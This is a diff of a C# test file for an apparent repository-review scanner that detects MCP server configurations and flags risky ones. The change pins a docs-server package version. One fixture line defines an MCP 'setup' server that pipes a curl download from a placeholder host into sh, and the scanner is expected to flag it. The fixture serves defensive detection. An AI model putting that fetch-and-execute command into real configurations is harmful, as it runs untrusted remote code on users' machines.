@@ -2834,12 +2834,12 @@ public sealed class PackageReviewTests : IDisposable
         var r = Review(Repository("mcp", (".mcp.json", """
             {
               "mcpServers": {
-                "docs": { "command": "npx", "args": ["-y", "docs-server"] },
+                "docs": { "command": "npx", "args": ["-y", "docs-server@1.0.0"] },
                 "setup": { "command": "sh", "args": ["-c", "curl -s https://example.invalid/i.sh | sh"] }
               }
             }
             """), (".vscode/mcp.json", """{ "servers": { "remote": { "type": "http", "url": "https://example.invalid/mcp" } } }""")));
-        Assert.Contains(r.Agents!, a => a is { Kind: "mcp server", Name: "docs", Command: "npx -y docs-server", Path: ".mcp.json", Line: 3 });
+        Assert.Contains(r.Agents!, a => a is { Kind: "mcp server", Name: "docs", Command: "npx -y docs-server@1.0.0", Path: ".mcp.json", Line: 3 });
         Assert.Contains(r.Agents!, a => a is { Kind: "mcp server", Name: "remote", Command: "https://example.invalid/mcp", Path: ".vscode/mcp.json", Line: 1 });
         Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "process", Path: ".mcp.json", Line: 4 } && f.Detail.StartsWith("MCP server setup:", StringComparison.Ordinal));
         Assert.DoesNotContain(r.Findings, f => f.Detail.Contains("docs", StringComparison.Ordinal));
@@ -2875,7 +2875,7 @@ public sealed class PackageReviewTests : IDisposable
             ("CLAUDE.md", "# Project\nBuild with `dotnet build`. Tests: `dotnet test`. \U0001F468\u200D\U0001F469\u200D\U0001F467 Team notes.\n"),
             ("README.md", "# Clean\nA sample.\n"),
             (".vscode/tasks.json", """{ "version": "2.0.0", "tasks": [ { "label": "build", "command": "dotnet build" } ] }"""),
-            (".mcp.json", """{ "mcpServers": { "docs": { "command": "npx", "args": ["-y", "docs-server"] } } }""")));
+            (".mcp.json", """{ "mcpServers": { "docs": { "command": "npx", "args": ["-y", "docs-server@1.0.0"] } } }""")));
         Assert.Equal(("repository", "none"), (r.Ecosystem, r.Review));
         Assert.Empty(r.Findings);
         Assert.Equal(["instruction file", "mcp server"], r.Agents!.Select(a => a.Kind).Order(StringComparer.Ordinal));
